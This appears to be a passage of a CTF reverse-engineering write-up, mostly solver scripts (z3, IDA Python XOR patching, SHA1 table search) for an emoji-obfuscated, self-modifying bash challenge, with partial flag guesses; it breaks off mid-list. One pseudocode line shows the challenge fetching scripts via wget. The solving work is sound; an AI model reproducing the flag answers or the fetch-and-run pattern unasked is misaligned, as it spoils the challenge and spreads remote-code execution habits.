arg = [0x00000000EE0F9DF9, 0x00000000C4E73EAD, 0x00000000D09B50EF, 0x000000009F758E2B, 0x00000000C7D7DB0B, 0x000000009DBE2A69, 0x00000000E38A352B, 0x00000000CA1FFFFF, 0x00000000F125338F, 0x00000000F5FEE2FB, 0x00000000BB5851D7, 0x00000000999B4ABD, 0x00000000A1C55209, 0x00000000F4CA133B, 0x00000000E8E26FA5, 0x00000000C32DDA41, 0x00000000DD6982FB, 0x00000000FC5F4D91, 0x00000000A0037ABB, 0x00000000A113B9DD, 0x00000000C93308F3, 0x000000009448EA39, 0x00000000B2FF73AD, 0x0000000086C0A263, 0x000000008B0C8427, 0x00000000E1C1771D, 0x00000000CE477441, 0x00000000E86F3DF9, 0x00000000EC65E2BD, 0x00000000EB800149, 0x00000000A37F8B1D, 0x00000000C7639133, 0x00000000CB7AEBDD, 0x00000000C2ECCFED, 0x00000000FF163BD9, 0x00000000A0F15895, 0x000000009B820709, 0x00000000A53A1B2B, 0x000000009CFEFC51, 0x00000000A7F9918F, 0x00000000F1B7E995, 0x00000000B513ED9B, 0x0000000092828A23, 0x00000000FC465845, 0x00000000E52B24A1, 0x0000000094ED65D9, 0x0000000096A84EFB, 0x000000008C296C57, 0x000000009D0CF09F, 0x00000000C9C170E7, 0x00000000C52FD5A9, 0x00000000861D06BB, 0x00000000D0FA8A5F, 0x0000000086D5AE6F, 0x00000000D08A8701, 0x00000000E48A14C3, 0x00000000D2232EA7, 0x00000000FF56B213, 0x000000008DF01487, 0x0000000095D9DBE5, 0x00000000816279D1, 0x00000000DD630D35, 0x00000000EA162535, 0x000000009AE3B49B]
s = Solver()
flag_int = [Int(f"flag{i}") for i in range(32)]

for i in range(32):
    s.add(flag_int[i] >= 0)
    s.add(flag_int[i] <= 0xFFFFFFFF)
    s.add((flag_int[i]*arg[i*2]) % r[i*2] == dst[i*2])
    s.add((flag_int[i]*arg[i*2+1]) % r[i*2+1] == dst[i*2+1])

if s.check() == sat:
    m = s.model()
    l = [m[flag_int[i]].as_long() for i in range(len(flag_int))]
    # print(l)
else:
    print("unsat")

flag = b''
for x in l:
    flag += x.to_bytes(4, 'big')
print(flag)
```



```
for ea in CodeRefsTo(0x25B009, False): # address of decompress
    get = []
    while True:
        ea = prev_head(ea) # 搵參數
        if get_operand_type(ea, 0) == 1 and get_operand_type(ea, 1) != 1:
            if get_operand_value(ea, 0) in [0, 6, 2]:
                get.append(get_operand_value(ea, 1))
        if len(get) == 3:
            break
    addr, length, key = get
    for ea in range(addr, addr+length): # xor
        del_items(ea)
        b = get_wide_byte(ea)
        b ^= (key & 0xFF)
        patch_byte(ea, b)
    create_insn(addr)
    add_func(addr)
```



```
import re

data = []
for ea in CodeRefsTo(0x25B009, False):
    get = []
    while True:
        ea = prev_head(ea)
        if get_operand_type(ea, 0) == 1 and get_operand_type(ea, 1) != 1:
            if get_operand_value(ea, 0) in [0, 6, 2]:
                get.append(get_operand_value(ea, 1))
        if len(get) == 3:
            break
    addr, length, key = get
    assert length == 86
    s = idaapi.decompile(addr)
    l1 = re.findall(r'std::string::operator[](a1, (d+)LL)', str(s))
    l2 = re.findall(r'^', str(s))
    l3 = re.findall(r'== (d+)', str(s))
#    if not l3:
#        print(hex(addr))
    data.append((int(l1[0]), int(l1[1]), int(l3[0]))) # 索引0 索引1 目標值
print(data)
```



```
# dst從上面拿的
dst = [(48, 49, 88), (14, 15, 93), (11, 12, 10), (51, 52, 70), (42, 43, 100), (12, 13, 57), (37, 38, 54), (21, 22, 9), (26, 27, 87), (1, 2, 8), (7, 8, 79), (22, 23, 56), (49, 50, 27), (45, 46, 30), (40, 41, 49), (29, 30, 28), (44, 45, 30), (19, 20, 72), (53, 54, 78), (39, 40, 106), (10, 11, 95), (46, 47, 50), (6, 7, 6), (38, 39, 92), (3, 4, 23), (23, 24, 60), (35, 36, 4), (13, 14, 50), (8, 9, 8), (41, 42, 94), (2, 3, 6), (20, 21, 95), (18, 19, 31), (47, 48, 89), (52, 53, 65), (5, 6, 70), (25, 26, 84), (50, 51, 67), (15, 16, 84), (30, 31, 88), (17, 18, 87), (28, 29, 43), (4, 5, 6), (0, 1, 3), (9, 10, 64), (31, 32, 111), (33, 34, 28), (27, 28, 108), (43, 44, 11), (24, 25, 83), (36, 37, 106), (32, 33, 43), (16, 17, 85), (34, 35, 89)]
got = []
while True:
    s = Solver()
    flag = [BitVec(f"flag{i}", 8) for i in range(55)]
    for i in range(55):
        s.add(flag[i] >= 32)
        s.add(flag[i] < 127)
    for t in dst:
        a, b, x = t
        s.add(flag[a] ^ flag[b] == x)
    for x in got:
        s.add(flag[0] != x)

    if s.check() == sat:
        m = s.model()
        l = []
        for i in range(55):
            l.append(m[flag[i]].as_long())
        got.append(l[0])
        print(bytes(l))
    else:
        break
```



```
if sha1(flag[idx:idx+sz])[1] == val:
    wget file1
    GALF *= value1
else:
    wget file2
    GALF *= value2
```



```
#!/bin/bash

function 🍋() {
    echo "$1 $2 $3 $4 $5 $6 $7";
    
}
function 👂() { 🍋 $1 $5 $2 $3 $7 $6 $4; }
# 原腳本中的函數定義，省略
function 💘() { 🍋 $4 $7 $3 $1 $2 $5 $6; }

👚 👣 👺 👅 👳 👱 👄 👂
# 原腳本中的emoji，省略
👍 👅 👙 👣 👄 💖 👓 👂
```



```
# 從前面的腳本中輸出的命令及其順序
emoji_data = '''👱 👄 👅 👺 👣 👳 👂
👲 👄 👅 👣 💅 👋 👂
👞 👄 👈 👧 👒 💁 💐
💀 👅 👥 👒 💁 💇 👂
💅 👅 👆 👽 💄 💓 👂
💌 👅 👈 👱 👢 👛 👂
👯 👃 💅 👗 💍 💉 👂
💏 👃 💔 👵 💌 👟 👤
👚 👃 👵 💈 👣 💃 👈
💐 👄 👄 💍 👂 👟 👂
👞 👅 👌 👟 👮 💓 💈
👋 👄 👏 👔 👴 👃 👐
💆 👃 👍 💖 💔 👕 👨
💍 👅 👅 👯 💒 👥 👂
👙 👃 👌 👒 👆 👵 👴
👠 👅 👄 👡 👞 👭 💔
👩 👄 👃 💃 👏 💁 👂
💃 👅 👎 👢 👩 👃 👬
👠 👃 👹 👟 👇 👛 👂
👯 👃 👆 👰 👬 👍 💌
💌 👃 👉 👮 💁 👹 👌
👝 👃 👇 👻 👓 👇 💘
👴 👅 👃 👗 💃 💅 👜
💒 👄 👏 👒 👯 👿 💀
👂 👄 👑 👬 👧 👝 👂
👵 👄 👉 👺 👂 👃 👼
💖 👄 👍 👯 👕 👹 👸
💄 👃 👇 💎 👸 💑 👨
👈 👄 👡 💁 👂 👇 👼
👓 👃 👇 💒 👲 👝 👂
👎 👃 👍 👠 👕 👓 👈
💒 👄 👇 👗 👃 👛 👜
👦 👅 👃 👕 💅 👿 👂
👄 👄 👆 👠 💗 💃 💔
💒 👅 👊 👵 💁 👣 💄
👧 👃 👂 💀 👣 👩 👂
👣 👅 👈 💇 💘 💃 👈
💑 👃 👎 💓 👡 👑 👸
👒 👄 👎 💄 👸 👉 👂
💎 👄 👇 👅 👭 👻 💔
💆 👅 👯 👇 👓 👋 👂
👵 👃 👌 👧 👈 👋 👼
💕 👃 💐 💅 👫 👍 👠
👦 👅 👆 👆 👚 👏 💔
💓 👅 👍 👦 👋 👻 👤
👼 👄 👉 👓 👅 👅 👘
💏 👄 👏 💎 👩 👝 💈
👶 👅 👂 👑 👡 👧 💌
👱 👃 👅 💔 💏 👥 👂
👝 👄 👅 👭 👜 💃 👂
💂 👃 💑 💓 👆 👝 👸
👹 👅 👸 👖 👻 💗 👂
👠 👅 👈 👰 💖 👓 👂
💆 👅 👍 👛 👘 👉 👨
👻 👅 👆 💕 👟 👍 💌
👙 👅 👋 💋 💄 👫 👂
👥 👄 👊 👵 💕 👣 👂
👴 👃 👃 👎 👝 👏 👂
👷 👃 👏 👗 👡 👱 👂
👸 👄 👄 💖 👙 👹 👂
💖 👃 👃 👪 👰 👻 👬
💌 👃 👇 👠 👘 👭 👂
💁 👅 💊 💏 👏 👩 👜
👔 👃 👅 👟 👆 👿 👂
👻 👅 👊 💈 💃 👙 👰
👜 👅 👏 👩 👰 💋 👂
👘 👄 👅 💎 👯 👃 👂
👊 👅 👍 👏 👬 👝 👂
👕 👅 👆 💂 👷 👑 👂
👥 👅 👎 👫 💏 👡 👂
💍 👃 👌 👑 👃 💁 👂
👑 👅 👑 💕 💃 💉 👠
👝 👅 👋 👌 👰 👿 👂
👭 👅 👊 👰 👼 👇 👂
👤 👃 👂 👒 💄 💉 👬
💔 👅 👉 💊 💗 💓 👂
👈 👄 👏 💘 👑 👿 💈
👢 👃 👆 👏 👔 💓 💄
👗 👃 👆 👱 👜 👯 👐
👖 👃 👉 👽 👟 👧 👜
👸 👅 👑 👎 👈 👣 👂
👬 👅 👋 👸 💘 👻 💄
👅 👅 👇 👇 👇 👻 👈
💄 👃 👲 💀 💘 👧 👂
👼 👅 💐 💍 👻 💏 👂
👮 👅 👢 💍 👚 💇 💘
👶 👃 👍 👫 👘 👿 👌
👪 👃 👉 👐 👭 👥 👂
💇 👄 👌 👺 👓 👛 👴
👔 👅 👂 💖 👊 👷 👘
💓 👄 👋 💏 👗 👳 👨
👭 👄 👂 👿 👘 👷 👂
👯 👃 👽 👡 👵 👋 👂
💑 👅 💃 👾 💖 👇 👈
💓 👃 👌 💆 👛 💗 💌
👘 👃 👅 👞 👅 👛 👔
👰 👄 👌 👰 👩 💇 💀
👆 👃 👏 👖 👒 👧 👂
👊 👄 👆 💁 👸 👯 💐
👪 👃 👈 👞 💕 👱 👂
👚 👅 👕 💔 👈 👋 👂
💊 👃 👂 👣 💂 💃 👂
💈 👃 👖 👂 💌 💓 👂
👖 👅 👈 👣 👋 👥 👴
👳 👅 👂 👿 👷 💗 👂
👻 👄 👉 💕 👓 👯 👂
💕 👃 👇 👘 💑 👉 👂
👏 👃 👇 👱 💌 👱 👂
👺 👃 👂 👦 👋 💃 👈
💁 👃 💇 👄 👂 👣 👈
💐 👄 👈 💀 👈 👷 👸
👄 👅 👆 💔 👪 👛 👂
👕 👄 👌 👲 💓 👅 👬
👨 👄 👊 💋 👎 👋 👼
💀 👄 👉 💂 👢 👅 👂
👅 👅 💐 👟 👧 👭 👂
👐 👄 💌 👟 💕 👱 👈
👞 👃 👂 💘 💆 👱 👂
👸 👃 👑 👷 👵 👻 👘
👅 👃 👊 👌 👶 👛 👂
👌 👅 👍 👩 👫 💁 👂
👑 👅 👌 👩 👻 👗 👠
👨 👅 👏 💀 👭 👥 👜
💇 👃 👏 👊 💔 👑 👤
💅 👃 👷 👿 👇 💓 👂
👃 👄 👽 💈 👃 👇 👠
👛 👃 👅 👩 👔 👗 💄
👇 👄 👌 👦 👮 👍 💄
💄 👅 👌 💌 👞 👡 💔
💈 👅 👐 👥 💈 👕 👂
👿 👃 👃 👾 👍 👣 👂
👲 👃 👎 💍 👬 💓 👂
👳 👄 👑 👻 👓 👿 👂
👮 👃 👅 👐 👌 👗 💔
👆 👃 👡 👯 💊 👅 👂
👆 👄 👏 💒 👛 💉 👂
👠 👄 👂 👖 👒 👽 👄
💐 👅 👈 💑 👆 👧 👂
👽 👄 👦 👴 👵 👳 👂
👨 👃 👅 👳 👨 👣 👂
👐 👄 👍 💅 💗 👓 👬
💖 👅 👄 👨 👃 👋 👂
👗 👄 👗 💇 👂 💏 👂
👸 👃 👈 👚 👽 👱 👂
👛 👅 👅 👧 👨 👳 👂
👿 👅 👌 👃 👉 👥 💐
👉 👃 👍 👣 👅 👥 👂
👫 👅 👆 💔 👾 👉 💄
👮 👄 👊 👬 💏 💁 👂
💐 👃 👈 👂 👲 💇 👂
💒 👃 👇 💘 👉 💗 👂
👥 👃 👃 💁 👜 💏 👂
💊 👄 👏 👶 👚 💍 💌
💅 👄 👆 💐 💗 👫 👴
💍 👅 👋 👕 👹 💓 👂
👖 👃 👃 💅 👥 👯 👂
👨 👄 👌 💂 💐 💗 👂
👓 👃 💒 💀 💌 👵 👰
👐 👅 👑 👳 👣 👥 👨
👶 👃 👉 💃 💘 💓 👂
💁 👅 👈 👄 💊 👕 💔
👠 👅 👆 💌 👙 👷 👤
👽 👄 👏 👔 👑 👇 💔
💐 👃 👅 👝 👳 👳 👂
💇 👅 👈 👈 👶 💇 👂
💋 👃 👉 💁 💀 💓 👸
👗 👄 👆 💋 💂 👿 👨
👫 👄 👇 👈 👩 👟 👂
👌 👃 👉 👷 👒 👿 💐
👳 👄 👑 👆 👡 👻 👸
👱 👅 👠 💎 💌 💕 👂
👚 👅 👇 👯 👕 👟 👂
👣 👃 👏 👼 👰 👽 👂
👰 👃 👉 👰 💍 👝 👂
💋 👄 👎 👦 👺 👕 👈
👟 👅 👏 👒 👳 👷 👂
👜 👄 👈 👇 💎 💃 👂
👮 👅 👂 👿 👢 👿 👂
👃 👅 👐 👐 👰 👻 👂
💂 👄 👏 👙 👹 👋 👂
💎 👅 👄 💑 👾 👷 💘
💏 👃 👍 👛 👤 💍 👤
💃 👄 👬 💔 👈 💅 👂
👊 👃 👂 👗 👑 👕 👼
👿 👃 👉 👪 👎 👱 👂
👶 👃 👉 👈 💓 💏 👈
👛 👃 👓 👬 👲 👅 👂
💑 👃 👃 👒 👨 💅 👂
👾 👅 👍 💔 👖 💃 👂
👚 👄 👌 💘 👗 💉 👂
👜 👅 👎 💗 👋 👩 👠
💑 👄 👐 💃 👇 👏 💔
👵 👄 👊 💐 👡 👳 👂
👂 👅 👉 👶 👟 💉 💈
👹 👃 👃 👖 👎 👷 👂
👜 👃 👋 💔 👍 👃 👰
👐 👃 👃 👺 💅 👻 👂
👤 👅 💇 💀 💔 💋 👼
👪 👄 👐 👱 💗 👉 👬
👠 👃 👅 💖 👻 👻 👰
👪 👅 👑 💎 👷 👙 👰
👩 👃 👆 💐 💅 👭 👂
👡 👅 👑 👎 👓 👝 👘
💂 👃 👉 👂 👙 👯 👂
👦 👃 👝 👩 💑 👡 👰
👘 👅 👎 👅 👗 👯 👂
👧 👄 👇 👇 👛 👥 💌
💕 👄 👆 👰 👨 👛 👂
👽 👃 👉 👚 👫 💉 👨
💗 👃 👌 💔 👯 👽 👂
👆 👅 👋 👋 👫 👯 👂
👻 👃 👅 👙 💆 👯 👂
👵 👅 👍 👊 👣 👻 💄
👎 👅 👋 👃 💌 👹 👂
👃 👄 👄 💈 👡 👥 👂
👍 👄 👆 👘 👨 👧 👄
👫 👃 👇 💖 👲 👟 👂
💂 👃 👉 👿 👡 👱 👸
💘 👃 👄 👒 👸 💓 👂
💄 👅 👃 💓 👏 💉 👂
👃 👃 👅 👋 👚 👋 👔
👶 👃 💉 👺 👚 💍 👂
👾 👄 👅 👬 👰 👽 💄
👼 👅 👆 👬 💍 👙 💐
👕 👅 👏 👑 💊 💁 👂
👤 👄 👄 👢 👍 💋 👂
💅 👃 👅 👶 💐 👇 👤
👉 👄 👃 💈 👜 👑 👔
👉 👅 👃 💊 💌 👗 👘
💆 👄 👍 👻 👠 👳 👸
💌 👅 👴 👚 👈 👃 💄
👲 👅 👂 💎 👷 👯 👂
👈 👃 👍 👆 👳 💓 💀
💏 👅 👄 👉 💇 👓 👄
💍 👅 👄 👰 💃 💃 👂
👹 👅 👉 👺 👣 💕 👂
💓 👄 💁 👅 👨 👱 👴
💉 👅 👚 👼 👼 💅 👂
👂 👃 👉 👼 👍 💁 💌
👭 👃 👎 👔 👷 👩 💘
💁 👃 👂 👙 💔 👹 👼
👬 👄 👃 💂 👙 💍 👂
💉 👅 👇 👭 👍 💕 👂
👛 👄 👊 👈 💘 👯 👐
👍 👃 👉 💅 👺 👳 💀
💕 👅 👎 👅 👖 👵 💐
👱 👅 👌 👛 👙 👷 👔
👓 👅 👌 👱 👉 💉 👂
👯 👅 👇 👿 💅 👃 👄
👶 👅 💆 💕 👌 👧 👂
👅 👄 👂 👴 👳 👉 👂
👼 👃 👑 👮 💈 👳 👠
👗 👅 👏 👸 👆 👭 👴
👓 👄 👋 👽 👮 👯 👤
👘 👃 👇 👸 💍 👿 👂
👙 👄 👅 👣 💖 👓 👂'''

def emoji_idx(x):
    if x == "❤️":
        return 87
    return ord(x)-ord("👂")

def emoji_zero_bits(x):
    x = bin(ord(x))[2:]
    return len(x) - x.rindex("1") - 1

emoji = ["👂", "👃", "👄", "👅", "👆", "👇", "👈", "👉", "👊", "👋", "👌", "👍", "👎", "👏", "👐", "👑", "👒", "👓", "👔", "👕", "👖", "👗", "👘", "👙", "👚", "👛", "👜", "👝", "👞", "👟", "👠", "👡", "👢", "👣", "👤", "👥", "👦", "👧", "👨", "👩", "👪", "👫", "👬", "👭", "👮", "👯", "👰", "👱", "👲", "👳", "👴", "👵", "👶", "👷", "👸", "👹", "👺", "👻", "👼", "👽", "👾", "👿", "💀", "💁", "💂", "💃", "💄", "💅", "💆", "💇", "💈", "💉", "💊", "💋", "💌", "💍", "💎", "💏", "💐", "💑", "💒", "💓", "💔", "💕", "💖", "💗", "💘", "❤️"]
assert [emoji_idx(x) for x in emoji] == list(range(88))
emoji_data = emoji_data.split("n")
emoji_data = [list(map(lambda x: emoji_idx(x), l.split(" ")[:5])) + list(map(lambda x: emoji_zero_bits(x), l.split(" ")[5:])) for l in emoji_data]
file_data = []
sha1_tables = []
PH = "."
FLAGLEN = 87
MAXSZ = 3

def init():
    import string
    from hashlib import sha1
    from itertools import product
    def getFromShell(file):
        l = []
        with open(f"download/{file}.sh", "r") as f:
            data = f.read().split("n")
            for i in range(103, 359):
                l.append(1 if data[i][-1] == "\" else 0)
        return l
    def getSha1Tables(n):
        d = {}
        for t in product(charset, repeat=n):
            if "{" in t and "}" in t:
                continue
            s = ''.join(t)
            if (x:=sha1(s.encode()).hexdigest()[1]) not in d.keys():
                d.update({x: [s]})
            else:
                d[x].append(s)
        return d
    # 取得所有下載的腳本的內容
    for i in range(88):
        file_data.append(getFromShell(emoji[i]))
    # 打表sha1 0-9A-Za-z_{}
    charset = string.digits + string.ascii_letters + "_{}"
    for i in range(4):
        sha1_tables.append(getSha1Tables(i))
    # 清空日誌
    with open("flag_log", "w") as f:
        f.write("")
    return

MAX_CNT = 64
def dfs(start):
    global MAX_CNT
    def getCondChars(idx):
        return set().union(*[set(s[i] for s in eq_conds[idx-i] if i < len(s)) for i in range(min(idx+1, MAXSZ))])
    def getCondIntrsct(idx0, idx1):
        assert idx0 < idx1 and idx1 - idx0 <= 2
        cond_chars_0 = set(s[idx1 - idx0] for s in eq_conds[idx0] if idx1 - idx0 < len(s))
        cond_chars_1 = set(s[0] for s in eq_conds[idx1])
        cond = cond_chars_0.intersection(cond_chars_1)
        # flag格式
        if idx1 not in [8, 86]:
            cond.discard("{")
            cond.discard("}")
        if not cond_chars_0 or (cond == cond_chars_0 and cond == cond_chars_1):
            return False
        eq_conds[idx0] = set(s for s in eq_conds[idx0] if idx1 - idx0 >= len(s) or s[idx1 - idx0] in cond)
        eq_conds[idx1] = set(s for s in eq_conds[idx1] if s[0] in cond)
        return True
    def getFlagChars(cur_idx):
        if flag_chars[cur_idx] != PH or len(s:=getCondChars(cur_idx)) == 1:
            if flag_chars[cur_idx] == PH:
                flag_chars[cur_idx] = s.pop()
            eq_conds[cur_idx] = set(s for s in eq_conds[cur_idx] if s[0] == flag_chars[cur_idx])
        for idx in range(max(cur_idx-MAXSZ+1, 0), cur_idx):
            if getCondIntrsct(idx, cur_idx):
                getFlagChars(idx)
                getFlagChars(cur_idx)
        for idx in range(cur_idx+1, min(cur_idx+MAXSZ, FLAGLEN)):
            if getCondIntrsct(cur_idx, idx):
                getFlagChars(cur_idx)
                getFlagChars(idx)
        return
    q = deque()
    q.append(start)
    while q:
        cur = q.pop()
        file_idx, line_idx, eq_conds, neq_conds, flag_chars, zero_cnt = cur
        if zero_cnt >= MAX_CNT:
            continue
        if line_idx >= len(emoji_data):
            break
        # print(file_idx, line_idx, zero_cnt, emoji_data[line_idx])
        hash_idx, hash_sz, hash_dst, eq_jmp, neq_jmp, eq_val, neq_val = emoji_data[line_idx]
        hash_dst = hex(hash_dst)[2:]
        # 計算新的line_idx
        while file_data[file_idx][line_idx] == 1:
            line_idx += 1
        line_idx += 1
        assert eq_val == 0
        # not equal分支
        new_neq_conds = deepcopy(neq_conds)
        new_eq_conds = deepcopy(eq_conds)
        if len(hash_dst) == 1:
            new_neq_conds[hash_idx] |= set(sha1_tables[hash_sz][hash_dst])
        # 刪除與neq_conds有交集的約束
        new_eq_conds[hash_idx].difference_update(new_neq_conds[hash_idx])
        q.append((neq_jmp, line_idx, new_eq_conds, new_neq_conds, flag_chars.copy(), zero_cnt+neq_val))
        if len(hash_dst) > 1: # 不可能equal
            continue
        # equal分支
        # 尋找可加入約束中的字串
        cond_chars = [getCondChars(hash_idx+i) for i in range(hash_sz)]
        # 兩個"_"相連不太可能
        tmp_to_add = set(s for s in sha1_tables[hash_sz][hash_dst] if "__" not in s)
        for i in range(hash_sz):
            if cond_chars[i]:
                rm = set(x for x in tmp_to_add if x[i] not in cond_chars[i])
                tmp_to_add.difference_update(rm)
        # 與原有約束沒有交集，丟棄節點
        if not tmp_to_add:
            continue
        # 刪除原約束中不與新約束相交的部分
        cond_chars = [set(s[i] for s in tmp_to_add) for i in range(hash_sz)]
        for i in range(hash_sz):
            idx = hash_idx + i
            for j in range(min(idx+1, MAXSZ)):
                rm = set(s for s in eq_conds[idx-j] if j < len(s) and s[j] not in cond_chars[i])
                eq_conds[idx-j].difference_update(rm)
        eq_conds[hash_idx].update(tmp_to_add)
        # 刪除與neq_conds有交集的約束
        eq_conds[hash_idx].difference_update(neq_conds[hash_idx])
        q.append((eq_jmp, line_idx, eq_conds, deepcopy(neq_conds), flag_chars.copy(), zero_cnt))
    with open("flag_log", "a") as f:
        for idx in range(FLAGLEN):
            getFlagChars(idx)
        f.write(''.join(flag_chars)+"n")
        print(''.join(flag_chars))
        for i in [idx for idx in range(FLAGLEN) if flag_chars[idx] == PH]:
        # for i in range(FLAGLEN):
            f.write(f" {i}: {eq_conds[i]}n")
    return

if __name__ == '__main__':
    from collections import deque
    from copy import deepcopy

    init()
    d = {}
    for i in range(FLAGLEN):
        d.update({i: set()})
    dfs((emoji_idx("❤️"), 0, deepcopy(d), deepcopy(d), [PH]*FLAGLEN, 0))
```



```
### 猜測時間到！
## flag格式
flag_chars[0] = 'h'
flag_chars[1] = 'k'
flag_chars[8] = '{'
## 兩個單字之間
# s33m1n9ly.b3g19n
# 18: {'_b3', 'Y', '_'}
flag_chars[18] = '_'
## .m0d1.y1n9 -> _modifying
# 76: {'Fm0', '_m0', '_m'}
# 81: {'v', 'f', 'fy', 'fy1'}
flag_chars[81] = 'f'
flag_chars[76] = '_'
## ..3lf -> _self
# 71: {'8s3', '_s3', '_E3'}
# 72: {'s', 's3', 'E'}
flag_chars[72] = 's'
flag_chars[71] = '_'
## d4n93r0... -> dangerous_
# 55: {'us_', 'Ls_', 'u', 'p', 'L', 'LsQ', 'u7_'}
# 56: {'7', 's'}
# 57: {'_w', 'Q', '_wh', '_'}
flag_chars[55] = 'u'
flag_chars[56] = 's'
flag_chars[57] = '_'
## wh....... -> wh.....ey
# 60: {'3Pe', '3n', '0uc', '36C', '0uJ', '0nJ', '3PO', '3p5', '0pC', '3ne', '3Lg', '0pJ', '3pO', '3P5', '3xC', '3p', '3xP', '0p3', '3u0', '3n_', '0xc', '06', '3x_'}
# 61: {'pgs', 'L', 'uCD', 'u', 'nCD', 'P3X', 'nPs', 'L5X', 'x', '6', 'nOE', '60D', 'p3X', 'L5E', 'pCX', '6cD', '6J7', 'n', 'p', 'LgZ', 'LgX', 'PgX', 'ucE', 'xOE', 'P', 'u0D', 'LcX', '6gE', 'ue7', 'n_7', '607', 'xPZ', '65Z', 'xc7', 'PgE', 'uPZ', 'P_X'}
# 62: {'3X', 'CD', 'gE', 'eE', 'eZ', '3s', 'O7', '3Z', '_7', '5D', 'PD', 'cs', '0s', 'JE', 'CE'}
# 63: {'D', 'E', 'X3Y', 'X', 'Dh3', '7', 's', '7KY', '7h3', 'Z'}
# 64: {'K', 'h', 'hY', 'h3', '3'}
# 65: {'3y_', 'YN_'}
# 66: {'N', 'y', 'y_4'}
flag_chars[65] = '3' # 沒有字尾會是YN相連的吧
flag_chars[66] = 'y'
## wh....h3y -> wh...they
# 60: {'0uc', '3Lg', '3PO', '06', '0uJ', '0pC', '3ne', '3xC', '3n_', '3xP', '0nJ', '3Pe', '0p3', '3P5', '3p5', '3u0', '3x_', '3p', '36C', '3pO', '0xc', '0pJ', '3n'}
# 61: {'u0D', 'u', 'p', '60D', 'ucE', 'P3X', 'P', '6', 'nPs', 'uPZ', 'LcX', 'nOE', 'LgX', 'n', 'pCX', '6J7', 'pgs', 'LgZ', 'xc7', 'nCD', '65Z', 'L5X', 'xPZ', 'L5E', 'uCD', '6gE', 'PgE', 'ue7', 'x', 'xOE', 'P_X', 'p3X', '607', '6cD', 'PgX', 'n_7', 'L'}
# 62: {'CE', 'CD', '3s', '3Z', '5D', 'JE', '0s', '3X', 'O7', 'cs', 'eZ', 'eE', '_7', 'gE', 'PD'}
# 63: {'7h3', '7', 'D', 'X', 's', 'Dh3', 'E', 'Z'}
flag_chars[63] = '7' # the和dhe，怎麼看都只能選the吧
## wh.._7h3y -> wh.._they
# 60: {'3n', '3p', '3x_', '3n_', '06'}
# 61: {'p', 'n', '6', 'n_7', 'x'}
flag_chars[61] = 'n' # when?
## b............c0.....3 -> ba...........co.....e
# 27: {'4s', 'xEG', '4sh', 'xEc', 'xED', 'xsV', '4s1', '4E_', '4EQ'}
flag_chars[27] = '4' # ba和bx的開頭，看起來ba可靠點
## b4sh_scr.....c0.....3 -> bash_scripts_co.....e
# 34: {'Nn', '3x', 'p6', 'Z6', 'Rp', '1p', 'op', '0u', 'Qx'}
# 35: {'pMs', 'xo', '6S', 'n7s', '6Ns', 'uEs', 'p7', 'nH', '6_Z', 'n_Z', 'xoZ', 'p', 'nms', 'x6', 'x', 'ntZ', '6H', 'pIZ', 'u', 'p7s', 'nEZ', 'uQs', '6Qs', 'nuZ', '6', 'nIs', 'xdZ', 'xws', 'nI', 'n'}
# 36: {'6sQ', '_s_', 'ws_', 'Qsk', 'MZk', 'SsQ', 'EsY', 'oZ_', 'EZ_', 'IsY', 'mZ_', 'dZk', '7s_', '7Zk', 'tsQ', 'wsk', 'SZk', 'wZk', 'Hsk', 'usY', 'osQ', 'NZ_'}
# 37: {'Z', 's_', 'Zk', 's', 'ZY', 'sQ'}
# 38: {'Y', 'k', '_', '_c', '_c0', 'Q'}
# bash scripts? 36是"_"的話單字太短了，只能38是底線了
flag_chars[34] = '1'
flag_chars[35] = 'p'
flag_chars[36] = '7'
flag_chars[37] = 's'
flag_chars[38] = '_'
## c0.....3 -> co..._.e
# 41: {'IUd', 'Wkj', '1P', 'Znd', 'Xs', 'HI', 'P1H', 'b1j', 'mkd', 'VI', 'Wp5', 'lPd', 'tXd', 'qeH', 'yzd', 'PIH', 'mr5', 'Gej', 'xPH', 'ytH', 'ePH', 'x1H', 'vY', '9Id', 'EH', 'VZ5', 'hzd', 'xH', 'Vnd', 'htd', 'orj', '7YH', 'hnH', 'ePj', 'jH', 'ezH', 'EkH', 'vrd', 'lH5', 'DeH', 'IXj', '1SH', '7td', 'Lt5', '8Y', 'xS5', 'JnH', 'JpH', 'hZj', 'HHd', 'jsj', 'es5', 'eX5', 'KHH', 'Bsj', 'qXd', 'NwH', 'Wnd', '8s', 'yZj', '4U', '_k5', 'bk5', 'xwd', 'HU5', 'Gs', 'kz5', 'Wp', 'QXd', 'xrd', 'sSj', '4X', 'mej', 'xk', 'Tn', 'Q15', 'EsH', 'ie5', 'VzH', 'h1j', 'H0', 'KZj', 'Vrd', 'iUd', 'swd', 'BHH', 'Qzj', 'xHd', 'PwH', '_sj', 'xId', 'brj', '1Uj', 'vH5', 'eI', 'qr', 'j1H', 'vY5', 'Tsj', '1sH', '7H5', 'jej', 'skj', 'ktd', 'EHj', 'qrj', 'PpH', 'JUH', '5Ud', 'yHj', 'Lw', '4HH', 'ewH', 'KUd', 'Csd', '6e', 'D0', 'QU', 'etj', 'Nr5', '9e5', 'LI5', 'sHH', '6pd', 'D1H', 'u1', 'et', 'WY5', 'vXd', 'Btd', 'JS', 'bp5', '_r5', 'Ls', 'eH5', 'hZ5', 'sYd', '5XH', 'Qej', 'J15', 'ZY', '5ZH', 'ur5', 'BI5', 'utH', 'otj', 'KS', 'NeH', 'u1d', 'qwj', 'hI', '4Id', 'HY', '7wH', 'TS5', 'ezj', 'Pe', '5nj', 'aH5', 't0', 'Lk', 'vHj', '_p', 'jPj', 'HtH', 'bP', 'usj', 'qY5', 'Dwj', 'xtH', '8UH', 'EZ5', 'qZH', 'BYj', 'kt', 'Zk', '4p5', 'twH', 't1j', '4sH', 'Ird', 'BUj', 'tIj', '8e5', 'QP', 'i0', 'ys5', '_05', '4s5', 'XU', 'Gwd', '5Hj', 'mZ', '9YH', 'yrj', '6H5', 'Zwd', 'Xrj', 'yI', 'hrj', 'uIH', 'kHH', '_ZH', 't1', 'oXj', '1S', 'IY', 'QSj', 'GId', 'Qwd', 'QHH', '5YH', 'jId', 'sz', 'ZX5', 'JZ5', '6r5', 'GI5', 'tX', 'uZj', 'zId', 'Jw5', 'IZd', 'Hw', 'T0j', 'Ktj', 'G05', 'u1j', '6nj', 'Zrj', 'LsH', 'aUd', 'hej', '7ed', 'LkH', 'sId', 'ZZj', 'tSH', 'Zw', 'Twj', 'btj', 'Qrj', 'v1d', 'QeH', '8ZH', 'op5', '_0', 'hnd', 'Ez5', 'Qrd', 'ktH', 'ke', 'qwd', 'kPj', 'Pe5', 'KYd', '6Zd', 'DPH', 'mzH', '615', '_rj', 'ZHH', 'Tkd', 'Ekd', 'Npj', 'L0j', 